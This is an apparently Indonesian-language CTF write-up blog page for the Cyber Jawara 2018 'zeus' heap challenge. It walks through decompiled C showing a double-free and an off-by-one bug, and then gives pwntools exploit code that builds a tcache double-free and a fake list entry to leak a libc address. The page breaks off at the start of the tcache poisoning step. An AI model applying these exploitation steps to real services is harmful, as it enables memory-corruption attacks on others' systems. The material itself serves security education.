<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="desc In-memory key-value database server like Redis and Memcache is widely used for caching in a production server. Can you pwn this key-value database service? You need to reverse engineered it first">
<meta property="og:type" content="article">
<meta property="og:title" content="Cyber Jawara 2018 Final - zeus">
<meta property="og:url" content="https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/index.html">
<meta property="og:site_name" content="Catousify">
<meta property="og:description" content="desc In-memory key-value database server like Redis and Memcache is widely used for caching in a production server. Can you pwn this key-value database service? You need to reverse engineered it first">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2018-10-16T17:54:22.609Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Cyber Jawara 2018 Final - zeus">
<meta name="twitter:description" content="desc In-memory key-value database server like Redis and Memcache is widely used for caching in a production server. Can you pwn this key-value database service? You need to reverse engineered it first">
    
    
        
          
              <link rel="shortcut icon" href="/img/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/img/favicon-96x96.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Cyber Jawara 2018 Final - zeus</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Catousify" type="application/atom+xml" />
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/atom.xml">rss</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2018/09/09/noxCTF-2018-Grocery-List/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&text=Cyber Jawara 2018 Final - zeus"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&title=Cyber Jawara 2018 Final - zeus"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&is_video=false&description=Cyber Jawara 2018 Final - zeus"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cyber Jawara 2018 Final - zeus&body=Check out this article: https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&title=Cyber Jawara 2018 Final - zeus"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&title=Cyber Jawara 2018 Final - zeus"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&title=Cyber Jawara 2018 Final - zeus"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&title=Cyber Jawara 2018 Final - zeus"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://zeroload.github.io/2018/10/14/Cyber-Jawara-2018-Final-zeus/&name=Cyber Jawara 2018 Final - zeus&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#desc"><span class="toc-number">1.</span> <span class="toc-text">desc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intro"><span class="toc-number">2.</span> <span class="toc-text">intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#internals"><span class="toc-number">3.</span> <span class="toc-text">internals</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#safe-malloc"><span class="toc-number">3.1.</span> <span class="toc-text">safe-malloc (?)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#single-linked-list-data"><span class="toc-number">3.2.</span> <span class="toc-text">single linked-list data</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bug"><span class="toc-number">4.</span> <span class="toc-text">bug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#double-free"><span class="toc-number">4.1.</span> <span class="toc-text">double-free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one-null-byte"><span class="toc-number">4.2.</span> <span class="toc-text">off-by-one null byte</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">5.</span> <span class="toc-text">exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#leak"><span class="toc-number">5.1.</span> <span class="toc-text">leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">5.2.</span> <span class="toc-text">tcache poisoning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#full-exploit"><span class="toc-number">6.</span> <span class="toc-text">full-exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rant"><span class="toc-number">7.</span> <span class="toc-text">rant</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Cyber Jawara 2018 Final - zeus
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Catousify</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-10-14T11:55:10.000Z" itemprop="datePublished">2018-10-14</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="desc"><a href="#desc" class="headerlink" title="desc"></a>desc</h2><blockquote>
<p>In-memory key-value database server like Redis and Memcache is widely used for caching in a production server. Can you pwn this key-value database service? You need to reverse engineered it first to know what data structure is used for storing the data. This service is also run with sandbox. For patching, you are only allowed to patch 32 bytes in ‘zeus’ binary and only 2 bytes in ‘zeus_sandbox’. For this service, all attack points are multiplied by 2x.</p>
</blockquote>
<blockquote>
<p>Downloads :<br><a href="/assets/zeus/zeus">zeus</a><br><a href="/assets/zeus/libc-2.28-9dc614ec33ee0284064ec5535bda431c.so">libc-2.28-9dc614ec33ee0284064ec5535bda431c.so</a><br><a href="/assets/zeus/solve.py">solve.py</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">λ › ./zeus</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">(1) Insert</span><br><span class="line">(2) Delete</span><br><span class="line">(3) Lookup</span><br><span class="line">(0) Exit</span><br><span class="line"></span><br><span class="line">&gt;&gt; 1</span><br><span class="line">Key length: 8</span><br><span class="line">Insert key: AAAAAAAA</span><br><span class="line">Value length: 8</span><br><span class="line">Insert value: AAAAAAAA</span><br><span class="line">8</span><br><span class="line">[Key inserted] AAAAAAAA:AAAAAAAA</span><br><span class="line"></span><br><span class="line">(1) Insert</span><br><span class="line">(2) Delete</span><br><span class="line">(3) Lookup</span><br><span class="line">(0) Exit</span><br><span class="line"></span><br><span class="line">&gt;&gt; 3</span><br><span class="line">Key: AAAAAAAA</span><br><span class="line">Value: AAAAAAAA^C</span><br><span class="line"></span><br><span class="line">[*] &apos;/Challs/cj/p11-zeus/zeus&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">[*] &apos;/Challs/cj/p11-zeus/libc-2.28-9dc614ec33ee0284064ec5535bda431c.so&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>Problem heap dengan interface menu yang tidak terlalu asing (add-delete-view). libc yang dipakai adalah libc 2.28 dari ubuntu 18.10, dengan begitu fitur tcache ada di libc ini. Bisa diperiksa lagi juga,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ › grep tcache libc-2.28-9dc614ec33ee0284064ec5535bda431c.so</span><br><span class="line">Binary file libc-2.28-9dc614ec33ee0284064ec5535bda431c.so matches</span><br></pre></td></tr></table></figure></p>
<p>tcache itu apa sih? tcache ini secara singkat bisa dibaca di sini <a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a>, untuk yang belum paham glibc malloc dan internalnya, baca dulu <a href="https://github.com/shellpish/how2heap" target="_blank" rel="noopener">https://github.com/shellpish/how2heap</a></p>
<h2 id="internals"><a href="#internals" class="headerlink" title="internals"></a>internals</h2><p>Beberapa hal internal penting yang dipakai pada binary ini,</p>
<h3 id="safe-malloc"><a href="#safe-malloc" class="headerlink" title="safe-malloc (?)"></a>safe-malloc (?)</h3><p><em>request</em> size terbatas 0 - 0x400.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint_16t size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( size &amp;&amp; size &lt;= <span class="number">0x400</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, size);</span><br><span class="line">    _ptr = ptr;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="single-linked-list-data"><a href="#single-linked-list-data" class="headerlink" title="single linked-list data"></a>single linked-list data</h3><p>data disimpan dengan model linked list<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  uint_16t key_len;</span><br><span class="line">  uint_16t value_len;</span><br><span class="line">  <span class="keyword">char</span>* key;</span><br><span class="line">  <span class="keyword">char</span>* value;</span><br><span class="line">  _list* next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><h3 id="double-free"><a href="#double-free" class="headerlink" title="double-free"></a>double-free</h3><p>Pada <code>delete()</code>, jika list terakhir dihapus, pointer next terkahir (NULL) tidak diarahkan ke list sebelumnya, skema double-free dapat dilakukan hanya pada list terakhir.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">found = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( ptr-&gt;next )</span><br><span class="line">  &#123;</span><br><span class="line">    tmp = ptr;</span><br><span class="line">    ptr = (linked_list *)ptr-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> ( ptr-&gt;key &amp;&amp; !<span class="built_in">strcmp</span>(ptr-&gt;key, s) )</span><br><span class="line">      &#123;</span><br><span class="line">        found = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( ptr-&gt;next )</span><br><span class="line">          tmp-&gt;next = ptr-&gt;next; <span class="comment">// BUG</span></span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="off-by-one-null-byte"><a href="#off-by-one-null-byte" class="headerlink" title="off-by-one null byte"></a>off-by-one null byte</h3><p><code>insert()</code> pada saat memasukkan nilai null-byte ke string.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Key length: "</span>);</span><br><span class="line">fgets(&amp;s, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">_key_len = atoi(&amp;s);</span><br><span class="line">_key = (<span class="keyword">char</span> *)safe_malloc(_key_len);</span><br><span class="line"><span class="keyword">if</span> ( _key )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Insert key: "</span>, <span class="number">1024L</span>L);</span><br><span class="line">  fgets(_key, _key_len + <span class="number">2</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  _key[_key_len] = <span class="number">0</span>; <span class="comment">// BUG</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Value length: "</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  _value_len = atoi(&amp;s);</span><br><span class="line">  _value = (<span class="keyword">char</span> *)safe_malloc(_value_len);</span><br><span class="line">  <span class="keyword">if</span> ( _value )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Insert value: "</span>, <span class="number">1024L</span>L);</span><br><span class="line">    fgets(_value, _value_len + <span class="number">2</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    _value[_value_len] = <span class="number">0</span>; <span class="comment">// BUG</span></span><br><span class="line">    v0 = <span class="built_in">strlen</span>(_value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, v0);</span><br><span class="line">    found = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">list</span> = (linked_list *)p_list;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">list</span>-&gt;next )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">list</span> = (linked_list *)<span class="built_in">list</span>-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">list</span>-&gt;key &amp;&amp; !<span class="built_in">strcmp</span>(<span class="built_in">list</span>-&gt;key, _key) )</span><br><span class="line">      &#123;</span><br><span class="line">        found = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">list</span>-&gt;value_len &lt; _value_len )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">list</span>-&gt;value = <span class="built_in">realloc</span>(<span class="built_in">list</span>-&gt;value, _value_len + <span class="number">1</span>);</span><br><span class="line">          <span class="built_in">list</span>-&gt;value_len = _value_len;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(<span class="built_in">list</span>-&gt;value, _value, _value_len);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[Key modified] %s:%s\n"</span>, <span class="built_in">list</span>-&gt;key, <span class="built_in">list</span>-&gt;value);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !found )</span><br><span class="line">    &#123;</span><br><span class="line">      tmp = (linked_list *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">      tmp-&gt;key_len = _key_len;</span><br><span class="line">      tmp-&gt;value_len = _value_len;</span><br><span class="line">      tmp-&gt;key = _key;</span><br><span class="line">      tmp-&gt;value = _value;</span><br><span class="line">      tmp-&gt;next = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">list</span>-&gt;next = tmp;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[Key inserted] %s:%s\n"</span>, _key, _value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>off-by-one ini sebenernya gak terlalu berguna (??) karena jika mau diakitkan dengan exploit malloc dengan poison-null-byte, pointer untuk <code>free()</code> hanya pada linked list yang ukurannya tetap di 0x20, sedangkan poison-null-byte lebih mudah jika ukuran malloc 0x100++.</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>buat mempermudah penulisan exploit,<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(key, val)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, len(key).__str__())</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, key)</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, len(val).__str__())</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, val)</span><br><span class="line">    r.recvline(<span class="keyword">False</span>)</span><br><span class="line">    log.info(r.recvline(<span class="keyword">False</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(key)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, key)</span><br><span class="line">    log.info(r.recvline(<span class="keyword">False</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lookup</span><span class="params">(key)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, key)</span><br><span class="line">    r.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    <span class="keyword">return</span> r.recvline(<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>libc leak dapat memanfaatkan double-free. <code>free()</code> hanya dilakukan ke struct list ukurannya 0x20 yang berarti masuk ke <code>fastbin[1] (0x30)</code>.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">insert(<span class="string">'A'</span> * <span class="number">8</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin[0] (0x20) : AAAAAAAA -&gt; aaaaaaaa</span></span><br><span class="line"><span class="comment"># fastbin[1] (0x30) : A</span></span><br><span class="line"><span class="comment"># tcache_entry[1] (0x30 freelist) :</span></span><br><span class="line"><span class="comment"># list : A</span></span><br><span class="line"></span><br><span class="line">insert(<span class="string">'B'</span> * <span class="number">8</span>, <span class="string">'b'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin[0] (0x20) : AAAAAAAA -&gt; aaaaaaaa -&gt; BBBBBBBB -&gt; bbbbbbbb</span></span><br><span class="line"><span class="comment"># fastbin[1] (0x30) : A -&gt; B</span></span><br><span class="line"><span class="comment"># tcache_entry[1] (0x30 freelist) :</span></span><br><span class="line"><span class="comment"># list : A -&gt; B</span></span><br><span class="line"></span><br><span class="line">delete(<span class="string">'B'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache_entry[1] (0x30 freelist) : B</span></span><br><span class="line"><span class="comment"># list : A -&gt; B</span></span><br><span class="line"></span><br><span class="line">delete(<span class="string">'A'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache_entry[1] (0x30 freelist) : B -&gt; A</span></span><br><span class="line"><span class="comment"># list : B</span></span><br><span class="line"></span><br><span class="line">delete(<span class="string">'B'</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache_entry[1] (0x30 freelist) : B -&gt; A -&gt; B</span></span><br><span class="line"><span class="comment"># list : B</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb-peda$ heapinfo</span></span><br><span class="line"><span class="comment"># (0x20)     fastbin[0]: 0x0</span></span><br><span class="line"><span class="comment"># (0x30)     fastbin[1]: 0x0</span></span><br><span class="line"><span class="comment"># (0x40)     fastbin[2]: 0x0</span></span><br><span class="line"><span class="comment"># (0x50)     fastbin[3]: 0x0</span></span><br><span class="line"><span class="comment"># (0x60)     fastbin[4]: 0x0</span></span><br><span class="line"><span class="comment"># (0x70)     fastbin[5]: 0x0</span></span><br><span class="line"><span class="comment"># (0x80)     fastbin[6]: 0x0</span></span><br><span class="line"><span class="comment"># (0x90)     fastbin[7]: 0x0</span></span><br><span class="line"><span class="comment"># (0xa0)     fastbin[8]: 0x0</span></span><br><span class="line"><span class="comment"># (0xb0)     fastbin[9]: 0x0</span></span><br><span class="line"><span class="comment">#                   top: 0xbb8370 (size : 0x1fc90) </span></span><br><span class="line"><span class="comment">#        last_remainder: 0x0 (size : 0x0) </span></span><br><span class="line"><span class="comment">#             unsortbin: 0x0</span></span><br><span class="line"><span class="comment"># (0x30)   tcache_entry[1]: 0xbb8350 --&gt; 0xbb82e0 --&gt; 0xbb8350 (overlap chunk with 0xbb8340(freed) ) !!!</span></span><br></pre></td></tr></table></figure></p>
<p>Seeb, udah punya 2 pointer yang sama di freelist. Lanjut, karena setiap <em>request</em> list data baru selalu melakukan malloc(0x20), biar mencegah linked list jadi infinite loop, buat value/key ukurannya jatuh di fastbin[1] (0x30) yang berarti sekitar [0x19 - 0x28]. Dari sini bisa dimanfaatkan untuk membuat fake list yang meng <em>overwrite</em> list B.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fake list di B</span></span><br><span class="line">fake_list  = p64(<span class="number">0</span>) <span class="comment"># fd</span></span><br><span class="line">fake_list += p64(<span class="number">0x00400505</span>) <span class="comment"># key : str.malloc</span></span><br><span class="line">fake_list += p64(<span class="number">0x602020</span>) <span class="comment"># value : reloc.puts</span></span><br><span class="line">fake_list += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line"></span><br><span class="line">insert(<span class="string">'A'</span> * <span class="number">8</span>, fake_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache_entry[1] (0x30 freelist) : B</span></span><br><span class="line"><span class="comment"># list : malloc -&gt; B</span></span><br><span class="line"></span><br><span class="line">puts = u64(lookup(<span class="string">'malloc'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure></p>
<p>Loh, kok freelist jadi tinggal B? Sebelum <code>insert()</code> untuk key <code>&#39;B&#39; * 8</code>, <code>malloc()</code> untuk value lebih dulu dilakukan jadi list untuk <code>&#39;B&#39; * 8</code> ter- <em>overwrite</em> oleh fake list. Intinya <code>&#39;B&#39; * 8</code> terhapus sehingga <code>malloc(0x20)</code> tetap dilakukan untuk key <code>&#39;B&#39; * 8</code> (ada dua kali <code>malloc(0x20)</code>). Untuk leak hanya perlu lookup value dari <code>malloc</code> karena sudah dibuat fake list dengan key <code>malloc</code> dan value ptr ke <code>reloc.puts</code> (got puts).</p>
<h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>tcache poisoning pada dasarnya hanya mengubah tcache_entry pada malloc`d yang telah di free ke value yang diinginkan. Kondisi heap pada saat sebelum setelah di <code>free()</code>,</p>
